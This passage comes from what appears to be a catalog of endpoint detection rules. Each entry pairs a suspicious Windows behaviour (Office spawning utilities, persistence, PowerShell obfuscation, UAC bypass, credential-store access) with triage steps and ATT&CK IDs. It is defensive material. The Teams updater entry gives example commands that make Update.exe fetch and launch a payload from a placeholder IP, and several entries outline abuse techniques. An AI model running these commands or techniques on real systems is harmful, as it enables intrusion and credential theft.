<summary>Malicious Document - Word Spawns CertUtil</summary>



#### Description

This detection identifies the ‘CertUtil.exe’ utility being spawned by Microsoft Word. ‘CertUtil.exe’ is normally used to manage SSL certificates, but malicious actors often misuse it to download additional malicious payloads once they have access to a system. 

#### Recommendation

Attempt to determine the document that may have caused this behavior. Examine anything else that the Word process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word spawns cmd.exe</summary>



#### Description

This detection identifies Microsoft Word spawning ‘cmd.exe’. Malicious document and spreadsheet files will often use macros that will then run ‘cmd.exe’ commands.

#### Recommendation

View the command being run and attempt to determine what it is doing. It may contain elements obfuscated with base64, character code substitution, or other obfuscation methods. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password


#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns CScript or WScript</summary>



#### Description

This detection identifies Microsoft Word spawning the CScript or WScript utilities. CScript and WScript are often used by malicious actors to execute JavaScript or VBScript code, which is usually done by malicious documents. CScript or WScript being executed by Microsoft Word is an indicator that a malicious spreadsheet file may have been opened.

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- JavaScript - T1059.007
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns Event Viewer</summary>



#### Description

This detection identifies Microsoft Word spawning the Windows Event Viewer. Malicious documents may exhibit this behavior, since the Event Viewer can be abused by malicious actors to bypass User Account Control protections. 

#### Recommendation

Examine any other processes launched by Microsoft Word in the same time frame as Event Viewer. Attempt to determine the document that was opened that may have triggered this behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns Executable From Users Directory</summary>



#### Description

This detection identifies processes being launched by Microsoft Word from the user’s directory. This technique is used by malicious actors to use malicious documents to drop malware into the target’s directory, then have Microsoft Word execute them.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- Malicious File - T1204.002
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns Java</summary>



#### Description

This detection identifies Microsoft Words spawning Java. This may indicate a malicious macro or exploit in the document that is attempting to run Java code. 

#### Recommendation

Examine any other processes launched by Microsoft Word in the same time frame as Java. Attempt to determine the document that was opened that may have triggered this behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns MSIExec</summary>



#### Description

This detection identifies Microsoft Word spawning MSIExec. Malicious documents will do this when attempting to download or execute additional malicious payloads.

#### Recommendation

Analyze the file opened by MSIExec, and identify if it is on disk, or analyze the URL it is downloading from if a URL appears in the command. Attempt to determine and analyze the document that caused this activity.  Examine anything else that the Word process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Msiexec - T1218.007
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns Schtasks.exe</summary>



#### Description

This detection identifies Microsoft Word spawning ‘Schtasks.exe’. This may be done by malicious documents that are attempting to set up scheduled tasks. 

#### Recommendation

Examine any other processes launched by Microsoft Word in the same time frame as ‘Schtasks.exe’. Attempt to determine the document that was opened that may have triggered this behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Word Spawns svchost.exe</summary>



#### Description

This detection identifies Microsoft Word spawning ‘svchost.exe’, which may be indicative of malicious document behavior. 

#### Recommendation

Examine any other processes launched by Microsoft Word in the same time frame as svchost.exe. Attempt to determine the document that was opened that may have triggered this behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Malicious Document - Word Spawns verclsid.exe</summary>



#### Description

This detection identifies Microsoft Word spawning verclsid.exe, which malicious documents may use to initiate network connections and download and write files to disk.

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Malicious Document - Word Spawns wmic.exe</summary>



#### Description

This detection identifies Microsoft Word spawning ‘wmic.exe’. Malicious documents may use ‘wmic.exe’ to interact with Windows Management Instrumentation, and perform actions, such as creating new processes and moving laterally.

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Network Discovery - Domain Computers via Net.exe</summary>



#### Description

This detection identifies the Windows Net utility being used to list hosts in the environment. This is  used by malicious actors to discover targets for lateral movement.


#### Recommendation

Determine if this activity is expected behavior for the user, such as a systems administrator. Investigate the process chain leading to the execution of ‘Net.exe’. Look for any additional discovery techniques being performed around the same time, such as ipconfig or whoami, that might be indicative of a malicious actor performing reconnaissance in the environment.


#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Network Discovery - Domain Controllers via Net.exe</summary>



#### Description

This detection identifies the Windows Net utility being used to list domain controllers in the environment. This is often used by malicious actors to discover targets for lateral movement.

#### Recommendation

Determine if this activity is expected behavior for the user, such as a systems administrator. Investigate the process chain leading to the execution of ‘Net.exe. Look for any additional discovery techniques being performed around the same time, such as ipconfig or whoami, that might be indicative of a malicious actor performing reconnaissance in the environment.


#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Network Discovery - echo %logonserver%</summary>



#### Description

This detection identifies the command  echo %logonserver% being run. This command will show the name of the domain controller that the host is connected to. Attackers may use this to identify targets for lateral movement.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Network Configuration Discovery - T1016


</details>



<details>
<summary>Network Discovery - Nltest Enumerate Domain Controllers</summary>



#### Description

This detection identifies Nltest, which is a Windows utility for interacting with Active Directory Domain Services. It can be used by malicious actors to gather information about an Active Directory network.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018
- Domain Trust Discovery - T1482


</details>



<details>
<summary>Notable Behavior - vaultcmd.exe</summary>



#### Description

This detection identifies use of 'vaultcmd.exe, a command line utility for accessing the Windows Credential Locker. A malicious actor may use this to enumerate credentials stored in the Credential Locker.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Credentials from Password Stores - T1555


</details>



<details>
<summary>Permission Modification - Takeown or Icacls used on Windows system binaries</summary>



#### Description

This detection identifies the Windows utilities Takeown and Icacls being used to modify ownership and access rights on files and directories. A privileged malicious actor can use them to modify access controls on Windows system binaries. 

#### Recommendation

Investigate any instances of the targeted system binary being run in the timeframe shortly after this alert. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Persistence - Bitsadmin SetNotifyCmdline</summary>



#### Description

This detection identifies the BitsAdmin utility running using the SetNotifyCmdLine flag. Malware uses this as a persistence mechanism.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. Review the command that BitsAdmin is being told to run. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- BITS Jobs - T1197


</details>



<details>
<summary>Persistence - Mobsync Launching Process</summary>



#### Description

Malware has been observed launching mobsync.exe, the Microsoft Sync Center, which itself launched another instance of the malware and created a scheduled task as a persistence mechanism for the malware.

ATT&CK Tactic Categorizations: 
Persistence: Local Job Scheduling

#### Recommendation

Investigate the parent process of mobsync.exe and the binary that is launched by mobsync.exe.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Persistence - Port Monitor Registry Persistence added by Reg.exe</summary>



#### Description

This detection identifies the process reg.exe adding registry key under HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors hive. Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.

#### Recommendation

Investigate the registry key added and the specified DLL referenced under Drivers entry. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Port Monitors - T1547.010


</details>



<details>
<summary>Persistence - Run Key Added by Reg.exe</summary>



#### Description

This detection identifies keys being added to the registry under SOFTWARE\Microsoft\Windows\CurrentVersion\Run. This can be performed by legitimate software being installed, but malicious actors do this to attempt to maintain persistence. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Persistence - SchTasks Creating A Task Pointed At Users Temp Or Roaming Directory</summary>



#### Description

This detection identifies the 'SchTasks.exe' utility being used to create a task that runs something from the Temp or Roaming directory. These directories are common targets for malicious actors.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>Persistence - Schtasks.exe Creating Task That Executes RunDLL32</summary>



#### Description

This detection identifies ‘Schtasks.exe’ being used to create a scheduled task that uses ‘RunDll32.exe’. Malicious actors have been observed achieving persistence of a malicious DLL by creating scheduled tasks that use ‘Rundll32.exe’ to execute a function from the DLL.

#### Recommendation

Investigate the process that spawned ‘schtasks.exe’. Acquire and analyze the DLL being executed. Identify any further processes launched by the rundll32 process when it executes the DLL.


#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- Rundll32 - T1218.011


</details>



<details>
<summary>Persistence - Script Runs From Startup Folder</summary>



#### Description

This detection identifies scripts running from a startup directory. Items placed in either the user's startup directory (%SystemDrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup) or the system's startup directory (%SystemDrive%:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp) will launch during login. This is used by malicious actors to achieve persistence.

#### Recommendation

Determine whether the process launched has a legitimate use. If not, remove from the startup folder, analyze the file for any recognizably malicious behavior, and investigate anything that may have been written to the filesystem around the same time.

#### MITRE ATT&CK Techniques

- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Persistence - Setting Debugger to Cmd or Powershell</summary>



#### Description

This detection identifies the debugger of a program being set to 'cmd.exe' or PowerShell. A malicious actor can edit the registry to set an executable to be designated as the debugger for another process. When that process runs, the ’debugger’ will run, which a malicious actor can use to execute code and maintain persistence. 

A common way to execute this attack vector is by setting the debugger for an accessibility tool, such as 'magnifier.exe' to 'cmd.exe'. Accessibility tools can be executed from a system's login screen. By opening the magnifier, a malicious actor can cause a command prompt to open without having to log into the system.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Accessibility Features - T1546.008


</details>



<details>
<summary>Persistence - Suspicious Scripting Task Created</summary>



#### Description

This detection identifies ‘Schtasks.exe’ being used to create a scheduled task for ‘Wscript.exe' or 'Cscript.exe’, to run a script that does not contains the standard file extensions of '.js', '.vbs',  or '.wsf'. Malicious actors have been observed achieving persistence of running a malicious script, using this technique.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task/Job - T1053


</details>



<details>
<summary>Persistence - TaskEng Executes DLL</summary>



#### Description

This detection identifies ‘TaskEng.exe’ executing a DLL using ‘rundll32.exe’. Malicious actors have been observed achieving persistence of a malicious DLL by creating scheduled tasks that use ‘rundll32.exe’ to execute a function from the DLL.

#### Recommendation

Investigate the process that spawned ‘schtasks.exe’. Acquire and analyze the DLL being executed. Identify any further processes launched by the rundll32 process when it executes the DLL.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- Rundll32 - T1218.011


</details>



<details>
<summary>Potential Persistence Attempt - Schtask With Echo</summary>



#### Description

This detection identifies a scheduled task being created using the ‘echo’ command. This behavior has been observed in use by malicious actors.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>PowerShell - Character Obfuscation</summary>



#### Description

This detection identifies a specific PowerShell obfuscation technique where a malicious actor will replace printable characters with the hexadecimal representation of that character. This will appear in the command similar to ‘[char]0x2F’. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - Command Start or Start-Process on Remote Script</summary>



#### Description

This detection identifies the -Command-Start or Start-Process commands in PowerShell being used to execute a script from a remote location. A malicious actor may use this to deploy additional payloads from a remote system to the compromised host. 

#### Recommendation

Investigate the file being served from the remote URL. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - Concatenate Strings</summary>



#### Description

This detection identifies multiple strings being concatenated in PowerShell. Malicious actors will often break up strings to evade detection.

#### Recommendation

Review the string that is being concatenated for suspicious behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell DNS TXT Payload Download</summary>



#### Description

This detection identifies a method of using PowerShell to download malicious payloads via DNS TXT records. Malicious actors may use DNS TXT records to host data so that any requests for the data will appear to be normal DNS traffic.

#### Recommendation

Investigate the domain that is being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- DNS - T1071.004


</details>



<details>
<summary>PowerShell - Get Version Table</summary>



#### Description

This detection identifies the PowerShell Version Table being requested. PowerShell-based malware will often attempt to determine the version of PowerShell on the system and execute differently based on the version. 

#### Recommendation

Investigate the command that was run, reverse any Base-64 or Gzip encoding in order to view full contents of the command. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - Headers['User-Agent'] string</summary>



#### Description

This detection identifies the string Headers['User-Agent'] in a PowerShell command. This has been observed in the TrickBot loader.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - ICM Execution</summary>



#### Description

This detection identifies PowerShell executing a script block via the ICM command, an alias of Invoke-Command. This is a legitimate command but is more frequently used by malicious code. 

#### Recommendation

Investigate the command being run with ICM. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - IEX in Environment Variable</summary>



#### Description

This detection identifies PowerShell executing the contents of an environment variable. Storing executable PowerShell scripts in an environment variable is a common defense evasion technique. Executing the code from the variable will often be done by using cmd.exe to echo the contents of the variable and piping it to PowerShell, which will then execute the code due to the IEX command in it.

#### Recommendation

Investigate the contents of the environment variable. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - Lateral Movement Using DCOM</summary>



#### Description

This detection identifies the use of the ExecuteShellCommand function from the MMC Application Class COM object. A malicious actor can use this to execute code on a remote system.

#### Recommendation

Review historical activity on the system that runs this command. The IP address of the system a malicious actor intends to execute a process on will be in the command line.  Investigate that host for suspicious activity, especially processes that were spawned by ‘MMC.exe’. Consider disabling DCOM or blocking RPC traffic between hosts.

#### MITRE ATT&CK Techniques

- Distributed Component Object Model - T1021.003
- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - Obfuscated Script</summary>



#### Description

This detection identifies base64 encoded or gzip compressed streams being passed to PowerShell.



#### Recommendation

Attempt to decode and examine the obfuscated script. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>PowerShell - Obfuscation Reverse</summary>



#### Description

This detection identifies the use of the reverse function in PowerShell. Malicious actors may do this to deobfuscate strings that were reversed to evade detection. 

#### Recommendation

Investigate the string that is being reversed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>PowerShell - Runtime.InteropServices.Marshal</summary>



#### Description

This detection identifies the function Runtime.InteropServices.Marshal being used as part of a PowerShell command. This function is used for memory management and often appears in shellcode injection activity. 


#### Recommendation

Review the contents of the command for additional suspicious indicators. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- PowerShell - T1059.001


</details>



<details>
<summary>PowerShell - SecureStringToGlobalAllocUnicode</summary>



#### Description

This detection identifies the PowerShell function SecureStringToGlobalAllocUnicode being used. This function has been used by the malware Emotet for obfuscation purposes.

#### Recommendation

Review the contents of the command for additional suspicious indicators. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Privilege Escalation - Mocking Trusted Directory to Bypass UAC</summary>



#### Description

This detection identifies trusted Windows directories with a trailing space. To auto-elevate upon execution and bypass UAC, a binary must execute from a trusted directory, such as C:\Windows\. A malicious actor can abuse the Windows API to bypass the normal Windows file system naming convention restrictions and create a directory with a name, such as C:\Windows \ (note the space character after Windows). When an auto-elevating process in that directory is executed, the space will be ignored and the process will be treated as if it is executing from the legitimate C:\Windows\ directory.

#### Recommendation

Examine the process and its parent, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Privilege Escalation Tool - COMahawk</summary>



#### Description

COMahawk is a tool that chains exploits for Windows 10 vulnerabilities CVE-2019-1405 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1405) and CVE-2019-1322 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322) to grant elevated privileges. 

CVE-2019-1405 and CVE-2019-1322 were patched in October and November 2019, respectively. 

Additional information can be found at:
https://www.exploit-db.com/exploits/47684

#### Recommendation

Ensure all Windows 10 hosts are up-to-date with security patches to prevent exploitation.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Process Injection - Werfault Spawning Windows Script Interpreter</summary>



#### Description

This detection identifies the Windows process ‘werfault.exe’ spawning a script interpreter. Some post-exploitation frameworks inject into the process ‘werfault.exe’, and invoke additional commands as a result.

#### Recommendation

Investigate the activity occurring prior to and following the command execution to validate if it is authorized and expected. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Process Masquerading - Werfault.exe</summary>



#### Description

This detection identifies the execution of binaries named werfault.exe that do not contain the proper metadata for legitimate instances of werfault.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Process Masquerading - WinInit.exe</summary>



#### Description

This detection identifies processes masquerading as the process 'wininit.exe', a Windows system binary. Malicious actors may use the name 'wininit.exe' to disguise their own malicious binaries.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Proxy Execution - Microsoft Teams Updater Downloads or Executes Binary</summary>



#### Description

This detection identifies the Microsoft Teams Updater potentially being used to download a malicious file. A vulnerability in the updater (also called "Squirrel") for Microsoft Teams allows arbitrary code to be downloaded and run by the updater. The updater is a trusted signed binary and can allow the malicious executable to bypass application whitelisting.

Example commands:
Update.exe — update=http://198.51.100.1/
Update.exe — download=http://198.51.100.1/
Update.exe --processStart payload.exe --process-start-args "--runmalware"

#### Recommendation

Investigate the URL that is being contacted. Examine the process spawned by the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Proxy Execution: Pcwrun.exe Running Executable</summary>



#### Description

This detection identifies ‘Pcwrun.exe’, the Windows Program Compatibility Wizard, proxying the execution of malicious binaries. 

#### Recommendation

Examine the process spawned by the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Ransomware - fsutil usn deletejournal</summary>



#### Description

This detection identifies the FSUtil utility being used to delete the filesystem's journal. This tactic is used by ransomware, such as Petya.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this activity was part of expected administrator behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Indicator Removal on Host - T1070
- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Ransomware - PonyFinal Java Invocation</summary>



#### Description

This detection identifies the process command line arguments for the ‘PonyFinal’ java-based ransomware. The ransomware operators use batch files after successfully brute-forcing to drop java archives and mass encrypt systems. When the malware is executed from .bat files, it will spawn subprocesses with the identified command line arguments for Java executables to run a compiled java archive, .jar.


#### Recommendation

Investigate parent process and child process chains for suspicious activity to identify if the malware is deployed on the affected system(s). If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Certificate - New Root Certificate</summary>



#### Description

This detection identifies the installation of a new root certificate using ‘CertMgr.exe’. Root certificates may be installed by malicious actors so that they can intercept data encrypted on the device.


#### Recommendation

Determine if this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Install Root Certificate - T1553.004


</details>



<details>
<summary>Suspicious Command - Batch Script and Two Executable Files</summary>



#### Description

This detection identifies ‘cmd.exe’ command lines that contain references to a batch script and two executable files, in sequence. Malware droppers execute this while writing malicious payloads to disk.

#### Recommendation

Examine the contents of the referenced batch script and the two executable files. Investigate the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Command - MSHTA Executing VBScript</summary>



#### Description

This detection identifies ‘MSHTA.exe’ being used to execute Visual Basic script. This tactic is used in malicious documents. 

#### Recommendation

Analyze the VBScript being run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Command - PowerShell Downloads File via Internet Explorer Object</summary>



#### Description

This detection identifies the use of Internet Explorer COM objects in PowerShell to download a file from an external source.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Command - [Veeam.Backup.Common.ProtectedStorage]::GetLocalString</summary>



#### Description

This detection identifies the use of [Veeam.Backup.Common.ProtectedStorage]::GetLocalString in PowerShell. This command may allow a malicious actor to extract password hashes from Veeam Backup Databases.


#### Recommendation

Investigate the contents of the backup to determine if any credentials may have been stolen. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Credentials from Password Stores - T1555


</details>



<details>
<summary>Suspicious PowerShell - Remote Python Execution</summary>



#### Description

This detection identifies suspicious PowerShell invocation using the Python library ‘urllib2’ to download and execute a remote resource in memory.

#### Recommendation

Investigate the activity causing PowerShell to execute, and validate if it is authorized and expected. If it is not expected, acquire the remote resource and investigate. Consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Python - T1059.006


</details>



<details>
<summary>Suspicious Process - 7zip Executed From Users Directory</summary>



#### Description

This detection identifies 7zip being run from the Users directory. This may be indicative of a malicious actor using 7zip to either unzip tools that they want to deploy or to compress data for exfiltration.

#### Recommendation

Determine whether 7zip is being used as part of authorized administrator activity. Investigate the contents of the command line to determine what is being zipped or unzipped, and investigate whether those items are either additional tools a malicious actor may use or if they are files that a malicious actor may conceivably target for exfiltration. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Archive via Utility - T1560.001


</details>



<details>
<summary>Suspicious Process - 7zip or WinRAR Launches Cmd, CScript, MsHta, PowerShell, WScript</summary>



#### Description

This detection identifies scripting engines as child processes of compression programs. Malicious actors often compress files containing scripts being delivered as email attachments.

#### Recommendation

Examine the archive that was being opened, and the process it spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Signed Script Proxy Execution - T1216
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - Abnormal Executable File Extension</summary>



#### Description

This detection identifies processes running with unusual file extensions such as doc, png, jpg, or pdf. A malicious actor may do this to disguise what they are executing. 

#### Recommendation

Examine the process in question. Attempt to acquire the file for further analysis, or use a tool like Virus Total to look up the hash to see if the process a known and benign. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Abnormal Execution of  ColorCPL.exe</summary>



#### Description

This detection identifies suspicious process behavior from ColorCPL.exe. This process can be targeted by malicious actors for injection or can be used to proxy the execution of other commands. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Abnormal Execution of Search Indexer</summary>



#### Description

This detection identifies abnormal process behavior from SearchIndexer.exe, which may be targeted by malicious actors for process injection.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - AdLoad Malware File Paths</summary>



#### Description

This detection identifies file paths associated with AdLoad, a widespread adware and bundleware loader for macOS. 

#### Recommendation

